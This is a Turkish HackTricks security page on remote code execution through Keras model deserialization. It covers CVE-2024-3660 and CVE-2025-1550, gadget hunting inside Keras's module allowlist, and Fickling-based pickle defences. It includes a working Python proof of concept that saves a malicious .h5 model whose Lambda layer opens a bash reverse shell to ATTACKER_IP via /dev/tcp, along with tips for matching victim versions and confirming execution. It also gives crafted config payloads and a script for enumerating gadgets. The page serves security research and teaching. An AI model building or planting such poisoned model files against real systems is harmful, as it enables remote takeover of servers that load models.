# Keras Model Deserialization RCE ve Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına yönelik pratik exploitation tekniklerini özetler, yerel .keras formatının iç yapısını ve saldırı yüzeyini açıklar ve Model File Vulnerabilities (MFV'ler) ile fix sonrası gadget'ları bulmaya yönelik bir araştırmacı araç seti sunar.

## .keras model formatının iç yapısı

Bir .keras dosyası, en azından şunları içeren bir ZIP arşividir:<sup>[[1]](#references)</sup>
- metadata.json – genel bilgiler (ör. Keras sürümü)
- config.json – model mimarisi (birincil saldırı yüzeyi)
- model.weights.h5 – HDF5 biçimindeki ağırlıklar

config.json, recursive deserialization sürecini yönetir: Keras modülleri import eder, sınıfları/fonksiyonları çözümler ve saldırganın kontrolündeki sözlüklerden katmanları/nesneleri yeniden oluşturur.<sup>[[1]](#references)</sup>

Bir Dense katman nesnesi için örnek kod parçası:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization şu işlemleri gerçekleştirir:<sup>[[1]](#references)</sup>
- module/class_name anahtarlarından modül içe aktarma ve sembol çözümleme
- Saldırganın kontrolündeki kwargs ile from_config(...) veya constructor çağrısı
- İç içe nesnelere (activations, initializers, constraints vb.) özyinelemeli olarak girme

Geçmişte bu durum, config.json hazırlayan bir saldırgana üç primitive sağlıyordu:<sup>[[1]](#references)</sup>
- Hangi modüllerin içe aktarılacağını kontrol etme
- Hangi sınıfların/fonksiyonların çözümleneceğini kontrol etme
- Constructor/from_config'a aktarılan kwargs'ları kontrol etme

## CVE-2024-3660 – Lambda-layer bytecode RCE

Kök neden:
- Legacy Lambda deserialization, saldırganın kontrolündeki marshaled code'dan bir Python function'ı yeniden oluşturuyordu: `func_load()` payload'u base64 ile çözüyor, `marshal.loads()` çağrısı yapıyor ve bir `FunctionType` oluşturuyordu. Oluşturulan function'ın bytecode'u Lambda çağrıldığında çalışıyor, etkilenen 2.13 öncesi loader'lar ise legacy formatlar için safe-mode kontrollerini uygulamıyordu.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Native Keras v3 archive'da Lambda function, `code` alanı base64 ile kodlanmış marshaled code içeren bir `__lambda__` nesnesi olarak temsil edilir:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigasyon:
- Keras, yerel Keras v3 formatı için varsayılan olarak `safe_mode=True` uygular. `Lambda` içindeki serileştirilmiş Python lambda'ları, kullanıcı açıkça `safe_mode=False` ile devre dışı bırakmadığı sürece engellenir; bu koruma eski formatları aynı şekilde kapsamaz.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notlar:
- Eski formatlar (daha eski HDF5 kayıtları) veya eski kod tabanları modern kontrolleri uygulamayabilir; bu nedenle kurbanlar eski yükleyicileri kullandığında “downgrade” tarzı saldırılar hâlâ işe yarayabilir.

## CVE-2025-1550 – Keras 3.0.0–3.8.x'te rastgele modül içe aktarma

Temel neden:
- `_retrieve_class_or_fn`, `config.json` içindeki saldırgan denetimindeki modül dizelerinde `importlib.import_module(module)` kullandı.
- Etki: Özel hazırlanmış bir `.keras` arşivi, `safe_mode=True` olsa bile `Model.load_model()` işlevinin saldırganın seçtiği Python modüllerini ve işlevlerini, içe aktarma sırasında yan etkiler ve saldırgan denetimindeki bağımsız değişkenlerle birlikte içe aktarmasına neden olabilirdi.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit fikri:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Güvenlik iyileştirmeleri (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: içe aktarımlar resmi ekosistem modülleriyle sınırlıdır: keras, keras_hub, keras_cv, keras_nlp
- Varsayılan güvenli mod: safe_mode=True, güvenli olmayan Lambda serileştirilmiş işlevlerinin yüklenmesini engeller
- Temel tür denetimi: serileştirmeden çıkarılan nesneler beklenen türlerle eşleşmelidir

## Pratik istismar: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Eski TensorFlow-Keras dağıtımları hâlâ HDF5 model dosyalarını (`.h5`) kabul ediyor olabilir. Bir saldırgan, sunucunun daha sonra yüklediği veya çıkarım yaptığı bir modeli yükleyebilirse, savunmasız bir yükleyici saldırganın denetimindeki Python kodu içeren bir Lambda katmanının serileştirmesini kaldırabilir; bu kod daha sonra uygulamanın model iş akışında çalıştırılabilir.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Hedef model çağırdığında Lambda'nın reverse shell çalıştırdığı kötü amaçlı bir .h5 dosyası oluşturmak için minimal PoC:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notlar ve güvenilirlik ipuçları:
- Tetiklenme noktaları formata ve iş akışına göre değişir; referans verilen yazıda payload’ın tahmin sırasında iki kez çalıştığı gözlemlenmiştir. Yan etkilerin tekrarlanabileceğini varsayın ve payload’ları idempotent hâle getirin.<sup>[[7]](#references)</sup>
- Sürüm sabitleme: Serialization uyuşmazlıklarını önlemek için kurbanın TF/Keras/Python sürümleriyle eşleşin. Örneğin, hedefte kullanılan sürümler bunlarsa artifact’leri Python 3.8 ve TensorFlow 2.13.1 ile oluşturun.<sup>[[7]](#references)</sup>
- Ortamı hızlıca çoğaltma:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Doğrulama: `os.system("ping -c 1 YOUR_IP")` gibi zararsız bir payload, reverse shell'e geçmeden önce yürütmenin gerçekleştiğini doğrulamaya yardımcı olur (ör. tcpdump ile ICMP trafiğini gözlemleyin).<sup>[[7]](#references)</sup>

## Post-fix gadget surface inside allowlist

Keras module allowlist ve safe mode kullanılsa bile izin verilen callables yan etkilere yol açabilir. Örneğin, `keras.utils.get_file` bir URL'den dosya indirip yapılandırılmış cache konumuna yazar; bu da onu gadget analizi için aday hâline getirir.<sup>[[1]](#references)[[19]](#references)</sup>

Aday Lambda yapılandırması (çağrı imzasını kontrollü bir testte doğrulayın):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Önemli kısıtlama:
- `Lambda.call()` model girdisini her zaman ilk konumsal argüman, yapılandırılmış `arguments` değerlerini ise keyword argümanları olarak iletir. `get_file` için bu konumsal değer `fname` parametresini doldurur; tensor/yol uyuşmazlığı, herhangi bir indirme gerçekleşmeden bu adayın başarısız olmasına neden olabilir. Bu nedenle garantili çalışan bir gadget değildir.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML modelleri için ML pickle import allowlisting (Fickling)

Birçok AI/ML model formatı (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artefaktları ve diğer Python-native formatlar) Python pickle verileri içerir. Yukarıdaki eski Keras Lambda yolu bunun yerine marshal edilmiş işlev bytecode'u kullanır; dolayısıyla ayrı bir deserialization riskidir. Pickle opcode'ları, deserialization sırasında saldırganın kontrolündeki davranışları tetikleyebilir; bunlar arasında modelin kurcalanması veya RCE de vardır. Basit tarayıcılar yeni ya da listelenmemiş tehlikeli import'ları gözden kaçırabilir.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Uygulanabilir bir fail-closed savunma, Python'ın pickle deserializer'ını hook'layarak unpickling sırasında yalnızca incelenmiş, zararsız ML ile ilgili import'lara izin vermektir. Trail of Bits'in Fickling aracı bu politikayı uygular ve binlerce herkese açık Hugging Face pickle'ından oluşturulmuş, özenle derlenmiş bir ML import allowlist'i içerir.<sup>[[8]](#references)[[13]](#references)</sup>

“Güvenli” import'lar için güvenlik modeli (araştırma ve uygulamadan çıkarılan sezgiler): pickle tarafından kullanılan import edilmiş semboller aynı anda şunların tümünü karşılamalıdır:<sup>[[8]](#references)</sup>
- Kod çalıştırmamalı veya çalıştırılmasına neden olmamalı (derlenmiş/kaynak kod nesneleri, shell komutları çalıştırma, hook'lar vb. olmamalı)
- Keyfi öznitelikleri veya öğeleri almamalı/ayarlamamalı
- Pickle VM'den başka Python nesnelerini import etmemeli veya bunlara referans almamalı
- Dolaylı yoldan bile olsa ikincil deserializer'ları (ör. marshal, iç içe pickle) tetiklememeli

Fickling korumalarını süreç başlatılırken mümkün olduğunca erken etkinleştirin; böylece framework'lerin gerçekleştirdiği pickle yüklemeleri (`torch.load`, `joblib.load` vb.) denetlenir:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operasyonel ipuçları:
- Gerektiğinde hook'ları geçici olarak devre dışı bırakabilir/yeniden etkinleştirebilirsiniz:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Bilinen güvenilir bir model engellenirse, sembolleri gözden geçirdikten sonra ortamınız için allowlist'i genişletin:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling, daha ayrıntılı kontrol tercih ederseniz genel runtime guard'lar da sunar:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() tüm pickle.load() çağrıları için kontrolleri zorunlu kılar
  - fickling.check_safety(): kapsamlı uygulama için
  - fickling.load(path) / fickling.is_likely_safe(path) tek seferlik kontroller için

- Mümkün olduğunda pickle dışı model formatlarını tercih edin (ör. SafeTensors).<sup>[[15]](#references)</sup> Pickle kullanmanız gerekiyorsa, loader'ları en az ayrıcalıkla, network egress olmadan çalıştırın ve allowlist'i uygulayın.

Bu allowlist-öncelikli strateji, uyumluluğu yüksek tutarken yaygın ML pickle exploit yollarını etkili biçimde engeller. ToB'nin benchmark'ında Fickling, sentetik kötü amaçlı dosyaların %100'ünü işaretledi ve en popüler Hugging Face depolarındaki temiz dosyaların yaklaşık %99'una izin verdi.<sup>[[8]](#references)[[10]](#references)</sup>


## Araştırmacı araç seti

1) İzin verilen modüllerde sistematik gadget keşfi

keras, keras_nlp, keras_cv, keras_hub genelindeki aday çağrılabilirleri listeleyin ve dosya/network/process/env yan etkileri olanlara öncelik verin.<sup>[[1]](#references)</sup>

<details>
<summary>Allowlist'teki Keras modüllerinde potansiyel olarak tehlikeli çağrılabilirleri listeleyin</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Doğrudan deserialization testi (.keras arşivi gerekmez)

Kabul edilen parametreleri öğrenmek ve yan etkileri gözlemlemek için hazırlanmış dict'leri doğrudan Keras deserializer'larına aktarın.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Sürümler arası yoklama ve formatlar

Keras, farklı koruma önlemlerine ve formatlara sahip birden fazla kod tabanında/dönemde bulunur:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (eski, kaldırılması planlanıyor)
- tf-keras: ayrı olarak bakımı yapılıyor
- Multi-backend Keras 3 (resmi): yerel .keras formatını kullanıma sundu

Regresyonları veya eksik korumaları ortaya çıkarmak için testleri farklı kod tabanlarında ve formatlarda (.keras ile legacy HDF5) tekrarlayın.

## References

- [1] [Keras Model Deserialization'daki Güvenlik Açıklarını Araştırma (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization'a kontroller eklendi](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr raporu – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr raporu – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE ile root yetkisi](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling'ın yeni AI/ML pickle dosyası tarayıcısı](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML ortamlarının güvenliğini sağlama (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle tarama kıyaslama derlemi](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle saldırılarının arka planı](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors projesi](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers keyfi kod enjeksiyonuna izin veriyor](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API'si](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
